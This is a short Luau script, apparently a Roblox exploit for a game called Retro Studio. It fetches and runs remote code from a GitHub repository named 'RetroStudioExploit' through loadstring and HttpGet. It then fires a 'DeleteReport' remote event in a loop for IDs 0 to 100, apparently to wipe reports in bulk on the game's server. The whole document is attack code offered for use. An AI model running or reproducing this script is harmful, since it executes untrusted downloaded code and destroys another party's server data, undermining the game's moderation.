local Length = 100

local head = 'https://raw.githubusercontent.com/'
local github = 'RetroStudioExploit/'
local suffix = '/refs/heads/main/'

function loadScript(url:string)
    return loadstring(game:HttpGet(url))()
end

local REFLECT = loadScript(head .. github .. 'RetroScripts' .. suffix .. 'Globals/Reflect.lua')

for i = 0, Length do
    local dr:RemoteEvent = REFLECT.getEvent("DeleteReport")
    dr:FireServer(unpack({[1] = i, [2] = "", [3] = "", [4] = "", [5] = ""}))
end